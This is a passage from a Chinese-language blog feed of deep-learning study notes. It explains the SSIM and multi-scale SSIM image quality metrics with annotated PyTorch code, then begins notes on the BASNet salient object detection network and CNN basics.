artifacts”</p><p>最后，利用质量图的均值SSIM对图像的整体质量进行评价。</p><h2 id="MULTI-SCALE-STRUCTURAL-SIMILARITY"><a href="#MULTI-SCALE-STRUCTURAL-SIMILARITY" class="headerlink" title="MULTI-SCALE STRUCTURAL SIMILARITY"></a>MULTI-SCALE STRUCTURAL SIMILARITY</h2><p>多尺度结构相似</p><h3 id="Multi-scale-SSIM-index"><a href="#Multi-scale-SSIM-index" class="headerlink" title="Multi-scale SSIM index"></a>Multi-scale SSIM index</h3><p>图像细节的可感知性取决于图像信号的采样密度，图像平面到观测者的距离以及观测者视觉系统的感知能力。当这些因素不同时，对给定图像的主观评估也会不同。上一部分描述的单一尺度方法可能只适用于特定设置。多尺度方法是一种便利的方法来整合不同分辨率的图像细节。</p><p><img src="/2021/04/19/SSIM/image-20210414212351813.png" alt="image-20210414212351813"></p><p>以参考图像和失真图像信号作为输入，迭代地应用低通滤波器并对滤波后的图像进行2倍的下采样。规定原始图像为Scale 1,最后输出的图像为Scale M,进行了M-1次迭代。在第j个尺度，对比度和结构对比计算为$c_j(x,y)$和$s_j(x,y)$。亮度对比$l_M(x,y)$只在Scale M计算。</p><p>SSIM是将不同尺度的测量结果结合起来得到的</p><p>$SSIM(x,y)=[l_M(x,y)]^{\alpha_M}\prod_{j=1}^M[c_j(x,y)]^{\beta_j}[s_j(x,y)]^{\gamma_j}$</p><p>$\alpha_M$ $\beta_j$ $\gamma_j$  同样用来调整不同部分的相对重要性</p><p>为了简化参数选择，我们对所有j设置$\alpha_j=\beta_j=\gamma_j$</p><p>另外标准化跨尺度设置 $\sum_{j=1}^M \gamma_j=1$</p><p>这使所有不同参数设置(包含所有单尺度和多尺度的设置)具有可比性</p><p>接下来设置不同尺度的相关值</p><p>概念上说这个应该和人类视觉系统(HVS)的对比敏感度函数相关(CSF),CSF函数表明人类视觉敏感度在中频处达到峰值(每度视觉角度约4个周期)，沿高、低频方向均有所下降。然而CSF不能直接用于推导我们的参数，它通常是在可见阈值水平上使用简化刺激(正弦)测量的(?说啥呢)，但我们的目的是比较在可见失真水平下复杂结构图像的质量。</p><h3 id="Cross-scale-calibration"><a href="#Cross-scale-calibration" class="headerlink" title="Cross-scale calibration"></a>Cross-scale calibration</h3><p>我们使用图像合成方法来标定不同尺度的相对重要性</p><blockquote><p>MSE: <a href="https://blog.csdn.net/qq_38701868/article/details/99703998" target="_blank" rel="noopener">https://blog.csdn.net/qq_38701868/article/details/99703998</a></p><p>数理统计中均方误差是指参数估计值与参数真值之差平方的期望值，记为MSE。MSE是衡量“平均误差”的一种较方便的方法，MSE可以评价数据的变化程度，MSE的值越小，说明预测模型描述实验数据具有更好的精确度。 </p></blockquote><p>论文中给出对于一张给定8位/像素灰度测试图像，进行合成的失真图像表。</p><p><img src="/2021/04/19/SSIM/image-20210417164559480.png" alt="image-20210417164559480"></p><p>每张失真图像通过迭代过程生成，初始图像随机添加了高斯白噪音，迭代的过程使用了约束梯度下降方法(constrained gradient descent)在SSIM测量下寻找最坏图像，同时约束MSE是固定的，并限制失真仅在指定的尺度内发生。</p><p>实验中使用了5个尺度和12个失真等级，即使每行图片具有相同的MSE，它们的视觉质量也是很明显不同的，所以失真在不同尺度有很大差异。</p><p>实验使用了10张不同类型内容的图像(人脸，自然景观，植物，人造物品..)并创建10组失真图像。收集了八名受试者的数据，每名受试者一次看到一组测试图像，视野距离限制在每度视角32像素。受试者需要比较不同尺度的图片质量，并从每个尺度中选择认为具有相同质量的图像。例如，一个受试者选择了上图中圈出的认为具有相同质量的图像，记录在每个尺度被选择图片的位置并对所有测试图像和受试者进行平均计算。总的来说，受试者互相同意相比于自己选择的图像更多。</p><p>这些测试结果被标准化并用于计算前面式子中提到的相关指数。结果参数为:</p><p>$\beta_1=\gamma_1=0.0448$</p><p>$\beta_2=\gamma_2=0.2586$</p><p>$\beta_3=\gamma_3=0.3001$</p><p>$\beta_4=\gamma_4=0.2363$</p><p>$\alpha_5=\beta_5=\gamma_5=0.1333$</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>看完论文后看代码 wc…  不能说一模一样 简直是毫不相关</p><p>又面向百度补充了一些数学芝士以及相关代码</p><h3 id="为什么使用均值-标准差-协方差"><a href="#为什么使用均值-标准差-协方差" class="headerlink" title="为什么使用均值/标准差/协方差"></a>为什么使用均值/标准差/协方差</h3><p><a href="https://zhuanlan.zhihu.com/p/93649342" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/93649342</a></p><p><strong>用均值作为亮度的估计，标准差作为对比度的估计，协方差作为结构相似程度的度量。</strong> </p><p><img src="https://pic4.zhimg.com/80/v2-08872799ca644db63ea540816591a4eb_1440w.jpg" alt="img"></p><p><a href="https://blog.csdn.net/qq_36387683/article/details/108048693" target="_blank" rel="noopener">https://blog.csdn.net/qq_36387683/article/details/108048693</a></p><p>把与物体结构相关的亮度和对比度作为图像中结构信息的定义。因为一个场景中的亮度和对比度总是在变化的，所以我们可以通过分别对局部的处理来得到更精确的结果。</p><p><img src="https://img-blog.csdn.net/20150624000406734" alt="img"></p><h3 id="高斯函数"><a href="#高斯函数" class="headerlink" title="高斯函数"></a>高斯函数</h3><p><a href="https://blog.csdn.net/qinglongzhan/article/details/82348153" target="_blank" rel="noopener">https://blog.csdn.net/qinglongzhan/article/details/82348153</a></p><p><strong>一维</strong></p><p><img src="https://img-blog.csdn.net/20160928082700352" alt="img"></p><p>高斯函数广泛应用于统计学领域，用于表述正态分布，在信号处理领域，用于定义高斯滤波器，在图像处理领域，二维高斯核函数常用于高斯模糊Gaussian Blur。</p><p><img src="https://img-blog.csdn.net/20160928083711092" alt="img"></p><p>高斯的一维图是特征对称“bell curve”形状，a是曲线尖峰的高度，b是尖峰中心的坐标，c称为标准方差，表征的是bell钟状的宽度。</p><p><strong>二维</strong></p><p><img src="https://img-blog.csdn.net/20160928092115332" alt="img"></p><p>A是幅值，x~0~ y~0~是中心点坐标，σ<em>x</em> σ<em>y</em>是方差</p><p>以(0,0)为中心点</p><p><img src="/2021/04/19/SSIM/image-20210418204609055.png" alt="image-20210418204609055"></p><p><img src="http://www.ruanyifeng.com/blogimg/asset/201211/bg2012110708.png" alt="img"></p><h3 id="高斯模糊"><a href="#高斯模糊" class="headerlink" title="高斯模糊"></a>高斯模糊</h3><p><a href="http://www.ruanyifeng.com/blog/2012/11/gaussian_blur.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2012/11/gaussian_blur.html</a></p><p>高斯模糊将正态分布(高斯分布)用于图像处理，它是一种<a href="http://en.wikipedia.org/wiki/Smoothing" target="_blank" rel="noopener">数据平滑技术</a>（data smoothing）</p><p><strong>原理</strong></p><p>所谓”模糊”，可以理解成每一个像素都取周边像素的平均值。</p><p>“中间点”取”周围点”的平均值，就会变成1。在数值上，这是一种”平滑化”。在图形上，就相当于产生”模糊”效果，”中间点”失去细节。</p><p>图见引用链接</p><p>计算平均值时，取值范围越大，”模糊效果”越强烈。</p><p>如果使用简单平均，显然不是很合理，因为图像都是连续的，越靠近的点关系越密切，越远离的点关系越疏远。因此，<strong>加权平均更合理，距离越近的点权重越大，距离越远的点权重越小</strong>。</p><p><strong>权重</strong></p><p>正态分布是一种可取的权重分配模式。</p><p>在图形上，正态分布是一种钟形曲线，越接近中心，取值越大，越远离中心，取值越小。</p><p>计算平均值的时候，我们只需要将”中心点”作为原点，其他点按照其在正态曲线上的位置，分配权重，就可以得到一个加权平均值。</p><p>有了高斯函数，我们可以计算每个点权重。</p><p><strong>权重矩阵与计算</strong></p><p>计算细节见链接，写的很清楚。</p><p>为了计算权重矩阵，需要设定σ的值。</p><p>需要让周围点的权重之和等于1。</p><p>对所有点重复这个过程，就得到了高斯模糊后的图像。如果原图是彩色图片，可以对RGB三个通道分别做高斯模糊。</p><h3 id="高斯核与卷积"><a href="#高斯核与卷积" class="headerlink" title="高斯核与卷积"></a>高斯核与卷积</h3><p><a href="https://blog.csdn.net/weixin_39124778/article/details/78411314" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39124778/article/details/78411314</a></p><p>卷积可以帮助实现平滑算法。</p><p> 有噪点的原图，可以把它转为一个矩阵：</p><p><img src="/2021/04/19/SSIM/image-20210418211118130.png" alt="image-20210418211118130"></p><p><img src="/2021/04/19/SSIM/image-20210418211212490.png" alt="image-20210418211212490"></p><p>在图像平滑处理时，函数g通常取高斯核函数(高斯核函数的由来可以参考上面高斯模糊链接中的过程)。</p><p><strong>高斯核函数关于中心对称，所以直接对应相乘与旋转180°相乘效果一样</strong></p><p><img src="https://img-blog.csdn.net/20171101104851410?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2VpeGluXzM5MTI0Nzc4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p>这样相当于实现了g矩阵在原来图像上的划动</p><p><img src="https://img-blog.csdn.net/20171101105023638?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2VpeGluXzM5MTI0Nzc4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><h3 id="生成高斯核"><a href="#生成高斯核" class="headerlink" title="生成高斯核"></a>生成高斯核</h3><p><a href="https://blog.csdn.net/qq_16013649/article/details/78784791" target="_blank" rel="noopener">https://blog.csdn.net/qq_16013649/article/details/78784791</a></p><h4 id="通过一维生成二维"><a href="#通过一维生成二维" class="headerlink" title="通过一维生成二维"></a>通过一维生成二维</h4><p>由于高斯滤波器是可分的(G(x,y)=G(x)*G(y))，所以可以用一维高斯核得到二维高斯核</p><p><img src="https://pic2.zhimg.com/80/v2-9ea517ef15c1a0f17417a614627de039_720w.jpg?source=1940ef5c" alt="img"></p><p>先获取两个一维高斯核，而后对后一个高斯核进行转置，而后第一个高斯核和第二个高斯核通过矩阵相乘就可以得到一个二维高斯核了。</p><h4 id="直接生成二维"><a href="#直接生成二维" class="headerlink" title="直接生成二维"></a>直接生成二维</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(gaussian_kernel_width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(gaussian_kernel_width):</span><br><span class="line">        gaussian_kernel[i,j]=\</span><br><span class="line">        (<span class="number">1</span>/(<span class="number">2</span>*pi*(gaussian_kernel_sigma**<span class="number">2</span>)))*\</span><br><span class="line">        exp(-(((i<span class="number">-5</span>)**<span class="number">2</span>)+((j<span class="number">-5</span>)**<span class="number">2</span>))/(<span class="number">2</span>*(gaussian_kernel_sigma**<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><h3 id="计算细节"><a href="#计算细节" class="headerlink" title="计算细节"></a>计算细节</h3><p><a href="https://blog.csdn.net/qq_36387683/article/details/108048693" target="_blank" rel="noopener">https://blog.csdn.net/qq_36387683/article/details/108048693</a></p><p><strong>在实际应用中，一般采用高斯函数计算图像的均值、方差以及协方差，而不是采用遍历像素点的方式，以换来更高的效率。</strong></p><p>在上述公式中，$\mu_x,\sigma_x,\sigma_{xy}$都加入了一个8*8的方形窗，并且逐像素的遍历整幅图片。每一步计算，和SSIM都是基于窗口内像素的，最终得到一个SSIM指数映射矩阵，由局部SSIM指数组成。然而，$\mu_x,\sigma_x,\sigma_{xy}$简单的加窗会使映射矩阵出现不良的“分块”效应。作者实际上采用σ=1.5的高斯加权函数计算每个图像块(图像块大小11x11)的均值和标准差。</p><h4 id="边界点的处理"><a href="#边界点的处理" class="headerlink" title="边界点的处理"></a>边界点的处理</h4><p>如果一个点处于边界，周边没有足够的点</p><p>代码中采用的处理方式是padding=window_size//2</p><h3 id="低通滤波"><a href="#低通滤波" class="headerlink" title="低通滤波"></a>低通滤波</h3><p><a href="https://www.cnblogs.com/luyaoblog/p/7160948.html" target="_blank" rel="noopener">https://www.cnblogs.com/luyaoblog/p/7160948.html</a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="生成一维高斯核"><a href="#生成一维高斯核" class="headerlink" title="生成一维高斯核"></a>生成一维高斯核</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gaussian</span><span class="params">(window_size, sigma)</span>:</span> <span class="comment">#生成一维高斯核</span></span><br><span class="line">    gauss = torch.Tensor([exp(-(x - window_size//<span class="number">2</span>)**<span class="number">2</span>/float(<span class="number">2</span>*sigma**<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> range(window_size)])</span><br><span class="line">    <span class="keyword">return</span> gauss/gauss.sum()<span class="comment">#归一化</span></span><br></pre></td></tr></table></figure><h3 id="生成二维高斯核"><a href="#生成二维高斯核" class="headerlink" title="生成二维高斯核"></a>生成二维高斯核</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_window</span><span class="params">(window_size, channel)</span>:</span><span class="comment">#通过一维高斯核生成二维</span></span><br><span class="line">    _1D_window = gaussian(window_size, <span class="number">1.5</span>).unsqueeze(<span class="number">1</span>)<span class="comment">#升维</span></span><br><span class="line">    _2D_window = _1D_window.mm(_1D_window.t()).float().unsqueeze(<span class="number">0</span>).unsqueeze(<span class="number">0</span>)</span><br><span class="line">    window = Variable(_2D_window.expand(channel, <span class="number">1</span>, window_size, window_size).contiguous())</span><br><span class="line">    <span class="comment">#expand参数中 第一个参数是输出通道 即卷积核数量，输出通道数=channel说明经过卷积后通道数不变</span></span><br><span class="line">    <span class="comment">#第二个参数是inchannel(输入通道,与输入图像相同的通道数)/groups,由于groups=channel,所以在这里等于1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> window</span><br></pre></td></tr></table></figure><h3 id="计算SSIM"><a href="#计算SSIM" class="headerlink" title="计算SSIM"></a>计算SSIM</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ssim</span><span class="params">(img1, img2, window, window_size, channel, size_average = True)</span>:</span></span><br><span class="line">    mu1 = F.conv2d(img1, window, padding = window_size//<span class="number">2</span>, groups = channel) <span class="comment">#卷积求均值</span></span><br><span class="line">    mu2 = F.conv2d(img2, window, padding = window_size//<span class="number">2</span>, groups = channel)</span><br><span class="line"></span><br><span class="line">    mu1_sq = mu1.pow(<span class="number">2</span>)</span><br><span class="line">    mu2_sq = mu2.pow(<span class="number">2</span>)</span><br><span class="line">    mu1_mu2 = mu1*mu2</span><br><span class="line">    <span class="comment"># 在计算方差和协方差时用到了公式Var(X)=E[X^2]-E[X]^2, cov(X,Y)=E[XY]-E[X]E[Y].(这块盯了好久没懂，后来看到这个公式...还是太拉了</span></span><br><span class="line">    sigma1_sq = F.conv2d(img1*img1, window, padding = window_size//<span class="number">2</span>, groups = channel) - mu1_sq <span class="comment">#求方差</span></span><br><span class="line">    sigma2_sq = F.conv2d(img2*img2, window, padding = window_size//<span class="number">2</span>, groups = channel) - mu2_sq</span><br><span class="line">    sigma12 = F.conv2d(img1*img2, window, padding = window_size//<span class="number">2</span>, groups = channel) - mu1_mu2  <span class="comment">#求协方差</span></span><br><span class="line"></span><br><span class="line">    C1 = <span class="number">0.01</span>**<span class="number">2</span></span><br><span class="line">    C2 = <span class="number">0.03</span>**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    ssim_map = ((<span class="number">2</span>*mu1_mu2 + C1)*(<span class="number">2</span>*sigma12 + C2))/((mu1_sq + mu2_sq + C1)*(sigma1_sq + sigma2_sq + C2))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> size_average:</span><br><span class="line">        <span class="keyword">return</span> ssim_map.mean()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ssim_map.mean(<span class="number">1</span>).mean(<span class="number">1</span>).mean(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#不是太理解，留坑</span></span><br></pre></td></tr></table></figure><h3 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SSIM</span><span class="params">(torch.nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, window_size = <span class="number">11</span>, size_average = True)</span>:</span></span><br><span class="line">        super(SSIM, self).__init__()</span><br><span class="line">        self.window_size = window_size </span><br><span class="line">        self.size_average = size_average</span><br><span class="line">        self.channel = <span class="number">1</span> </span><br><span class="line">        self.window = create_window(window_size, self.channel) <span class="comment">#用初始化的channel创建window</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, img1, img2)</span>:</span></span><br><span class="line">        (_, channel, _, _) = img1.size()<span class="comment">#取img1的通道数</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> channel == self.channel <span class="keyword">and</span> self.window.data.type() == img1.data.type():<span class="comment">#判断初始化通道与img1通道数 判断window的数据类型与img1数据类型</span></span><br><span class="line">            window = self.window</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            window = create_window(self.window_size, channel) <span class="comment">#若不相等，创建img1 channel的window</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> img1.is_cuda:</span><br><span class="line">                window = window.cuda(img1.get_device())</span><br><span class="line">            window = window.type_as(img1) <span class="comment">#将window的数据类型转换为与img1相同</span></span><br><span class="line"></span><br><span class="line">            self.window = window <span class="comment">#使用通过img channel创建的window</span></span><br><span class="line">            self.channel = channel <span class="comment">#使用img1 channel</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> _ssim(img1, img2, window, self.window_size, channel, self.size_average)</span><br></pre></td></tr></table></figure><p>感觉定义类中输出输入的通道数和Conv2d中传入的高斯核window的中的参数有点绕</p><p>代码理解参考:</p><p><a href="https://blog.csdn.net/qq_17457331/article/details/88044462" target="_blank" rel="noopener">https://blog.csdn.net/qq_17457331/article/details/88044462</a></p><p><a href="https://jianzhuwang.blog.csdn.net/article/details/106450239" target="_blank" rel="noopener">https://jianzhuwang.blog.csdn.net/article/details/106450239</a></p><p><a href="https://blog.csdn.net/demo_jie/article/details/107197809" target="_blank" rel="noopener">https://blog.csdn.net/demo_jie/article/details/107197809</a></p><p>代码注释和论文解读可能有错，凑合着看TnT</p>]]></content>
    
    
    <categories>
      
      <category>Paper reading</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BASNet</title>
    <link href="/2021/01/19/BASNet/"/>
    <url>/2021/01/19/BASNet/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>Boundary-Aware Salient Object Detection 即边界感知显著目标检测</p><p><a href="https://imgtu.com/i/630zqS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/09/630zqS.png" alt="630zqS.png"></a></p><p>根据放假以来的学习，简单画了下理解网络所需要理解掌握的知识。自己还没有摸太清，只是目前理解的，待更新…</p><a id="more"></a><h1 id="BASNet"><a href="#BASNet" class="headerlink" title="BASNet"></a>BASNet</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h3><p>GD MBGD SGD区别:</p><p><a href="https://www.cnblogs.com/lliuye/p/9451903.html" target="_blank" rel="noopener">https://www.cnblogs.com/lliuye/p/9451903.html</a></p><p>? SGD为什么能逃脱鞍点:</p><p><a href="https://blog.csdn.net/bl128ve900/article/details/94293284" target="_blank" rel="noopener">https://blog.csdn.net/bl128ve900/article/details/94293284</a></p><h3 id="softmax"><a href="#softmax" class="headerlink" title="softmax"></a>softmax</h3><blockquote><p>我们知道max，假如说我有两个数，a和b，并且a&gt;b，如果取max，那么就直接取a，没有第二种可能但有的时候我不想这样，因为这样会造成分值小的那个饥饿。所以我希望分值大的那一项经常取到，分值小的那一项也偶尔可以取到，那么我用softmax就可以了  现在还是a和b，a&gt;b，如果我们取按照softmax来计算取a和b的概率，那a的softmax值大于b的，所以a会经常取到，而b也会偶尔取到，概率跟它们本来的大小有关。所以说不是max，而是 <strong>Soft</strong> max  那各自的概率究竟是多少</p><p>来源:<a href="https://www.zhihu.com/question/23765351" target="_blank" rel="noopener">https://www.zhihu.com/question/23765351</a></p></blockquote><p><img src="https://img-blog.csdn.net/20180902220822202?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JpdGNhcm1hbmxlZQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>softmax不仅把神经元输出构造成概率分布，而且还起到了归一化的作用，适用于很多需要进行归一化处理的分类问题。</p><p>?以softmax为激励函数交叉熵Loss函数的求导过程      </p><p><a href="https://www.iteye.com/blog/kissmett-2440592" target="_blank" rel="noopener">https://www.iteye.com/blog/kissmett-2440592</a></p><p><a href="https://blog.csdn.net/bitcarmanlee/article/details/82320853" target="_blank" rel="noopener">https://blog.csdn.net/bitcarmanlee/article/details/82320853</a></p><p>这个不懂 留坑了</p><h3 id="BN"><a href="#BN" class="headerlink" title="BN"></a>BN</h3><p>Batch Normalization批标准化</p><p><a href="https://www.cnblogs.com/guoyaohua/p/8724433.html" target="_blank" rel="noopener">https://www.cnblogs.com/guoyaohua/p/8724433.html</a></p><p><strong>BatchNorm就是在深度神经网络训练过程中使得每一层神经网络的输入保持相同分布的。</strong></p><p><strong>白化</strong>，<strong>就是对输入数据分布变换到0均值，单位方差的正态分布</strong></p><h4 id="Relu与BN层顺序问题"><a href="#Relu与BN层顺序问题" class="headerlink" title="Relu与BN层顺序问题"></a>Relu与BN层顺序问题</h4><p>这是我比较疑惑的问题，看到网络模型中Conv+BN+ReLU层，根据Batch Normalization，下一层输入不是应该保持相同分布更好吗，为什么不先进行激活再标准化下一层输入呢….</p><p><a href="https://www.cnblogs.com/zi-wang/p/12295529.html" target="_blank" rel="noopener">https://www.cnblogs.com/zi-wang/p/12295529.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/113442866?from_voters_page=true" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/113442866?from_voters_page=true</a></p><p><a href="https://www.zhihu.com/question/318354788" target="_blank" rel="noopener">https://www.zhihu.com/question/318354788</a></p><p>现在网络一般默认用BN-ReLu</p><p>Batch Norm方法经过规范化和缩放平移，可以使输入数据，重新回到非饱和区，还可以更进一步：控制激活的饱和程度，或是非饱和函数抑制与激活的范围。</p><h3 id="sigmoid"><a href="#sigmoid" class="headerlink" title="sigmoid"></a>sigmoid</h3><p>看到源码里BASNET中最后return的是几个side-output的sigmoid值不理解，留坑</p><h2 id="相关模型"><a href="#相关模型" class="headerlink" title="相关模型"></a>相关模型</h2><h3 id="CNN"><a href="#CNN" class="headerlink" title="CNN"></a>CNN</h3><p>卷积神经网络是一种带有卷积结构的深度神经网络，卷积结构可以减少深层网络占用的内存量，其三个关键的操作，<strong>其一是局部感受野，其二是权值共享，其三是pooling层</strong>，有效的减少了网络的参数个数，缓解了模型的过拟合问题。</p><h4 id="网络架构"><a href="#网络架构" class="headerlink" title="网络架构"></a>网络架构</h4><p><strong>卷积神经网络结构包括：卷积层，降采样层，全链接层。每一层有多个特征图，每个特征图通过一种卷积滤波器提取输入的一种特征，每个特征图有多个神经元。</strong></p><p>卷积神经网络是一种多层的监督学习神经网络，隐含层的卷积层和池采样层是实现卷积神经网络特征提取功能的核心模块。该网络模型通过采用梯度下降法最小化损失函数对网络中的权重参数逐层反向调节，通过频繁的迭代训练提高网络的精度。==卷积神经网络的低隐层是由卷积层和最大池采样层交替组成，高层是全连接层对应传统多层感知器的隐含层和逻辑回归分类器。==第一个全连接层的输入是由卷积层和子采样层进行特征提取得到的特征图像。最后一层输出层是一个分类器，可以采用逻辑回归，Softmax回归甚至是支持向量机对输入图像进行分类。</p><h4 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h4><p>卷积的目的：为了从输入图像中提取特征。卷积可以通过从输入的一小块数据中学到图像的特征，并可以保留像素间的空间关系。</p><h5 id="滤波器filter-卷积核kernel-的运算"><a href="#滤波器filter-卷积核kernel-的运算" class="headerlink" title="滤波器filter(卷积核kernel)的运算"></a>滤波器filter(卷积核kernel)的运算</h5><p>卷积运算细节:<a href="https://blog.csdn.net/dcrmg/article/details/79652487" target="_blank" rel="noopener">https://blog.csdn.net/dcrmg/article/details/79652487</a></p><p> 对于同样的输入图像，不同值的滤波器将会生成不同的特征图。</p><p>通过在卷积操作前修改滤波矩阵的数值，我们可以进行诸如边缘检测、锐化和模糊等操作 —— 这表明不同的滤波器可以从图中检测到不同的特征，比如边缘、曲线等。</p><p><strong>卷积核里面的参数，一开始是随机数，它本身是需要训练的权重值，只是一开始被初始化了为随机数，并不是一直都是随机数，它会随着网络的训练，逐渐发生变化，最后生成固定的权重值。</strong></p><p><strong>卷积核与通道数的关系</strong></p><p><a href="https://segmentfault.com/q/1010000016667038" target="_blank" rel="noopener">https://segmentfault.com/q/1010000016667038</a></p><p>看网络架构的时候很懵，回来补一下基础。</p><p><strong>卷积核数与输出通道数是相等的</strong>，且可以自定义，取决于自己的实验设置。</p><p><img src="https://img-blog.csdn.net/20180322130042532?watermark/2/text/Ly9ibG9nLmNzZG4ubmV0L2Rjcm1n/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p><img src="https://image-static.segmentfault.com/292/098/292098771-59e98309e35bc_fix732" alt></p><h5 id="特征图"><a href="#特征图" class="headerlink" title="特征图"></a>特征图</h5><p>通过在图像上滑动滤波器并计算点乘得到矩阵叫做“卷积特征（Convolved Feature）”或者“激活图（Activation Map）”或者“特征图（Feature Map）”。</p><p>特征图的大小（卷积特征）由三个参数控制：深度（depth）、步长（stride）、零填充（zero-padding）。</p><p>深度：深度对应的是卷积操作所需的滤波器个数。在下图的网络中，我们使用三个不同的滤波器对原始图像进行卷积操作，这样就可以生成三个不同的特征图。你可以把这三个特征图看作是堆叠的 2d 矩阵，那么，特征图的“深度”就是三。</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20180817/36f594f0081f4cb39401ee659348401b.jpeg" alt="img">步长：步长是我们在输入矩阵上滑动滤波矩阵的像素数。当步长为 1 时，我们每次移动滤波器一个像素的位置。当步长为 2 时，我们每次移动滤波器会跳过 2 个像素。<strong>步长越大，将会得到更小的特征图</strong>。</p><p>零填充：有时，在输入矩阵的边缘使用零值进行填充，这样我们就可以对输入图像矩阵的边缘进行滤波。零填充的一大好处是可以让我们控制特征图的大小。使用零填充的也叫做泛卷积，不适用零填充的叫做严格卷积。(padding用于提取边缘特征,解决图像边缘信息损失的问题)</p><h5 id="感受野"><a href="#感受野" class="headerlink" title="感受野"></a>感受野</h5><p>感受野，即一个像素对应回原图的区域大小</p><p>在卷积神经网络中，感受野（Receptive Field）的定义是卷积神经网络每一层输出的特征图（feature map）上的像素点在输入图片上映射的区域大小。再通俗点的解释是，特征图上的一个点对应输入图上的区域，如图1所示。</p><p><img src="https://img-blog.csdn.net/2018070813280633?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Byb2dyYW1fZGV2ZWxvcGVy/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p>感受野计算公式</p><p>关于感受野大小的计算方式是采用从最后一层往下计算的方法，即先计算最深层在前一层上的感受野，然后逐层传递到第一层，使用的公式可以表示如下：</p><p>$RF_i=(RF_{i+1}-1)*strife_i+K_{size_i}$</p><p>其中，$RF_i$是第i层卷积层的感受野，$RF_{i+1}$是（i+1）层上的感受野，stride是卷积的步长，Ksize是本层卷积核的大小。</p><h4 id="池化"><a href="#池化" class="headerlink" title="池化"></a>池化</h4><p>Pooling 的本质，其实是采样。Pooling 对于输入的 Feature Map，选择某种方式对其进行压缩。</p><p><strong>对输入的特征图进行压缩，一方面使特征图变小，简化网络计算复杂度；一方面进行特征压缩，提取主要特征</strong>。</p><p><img 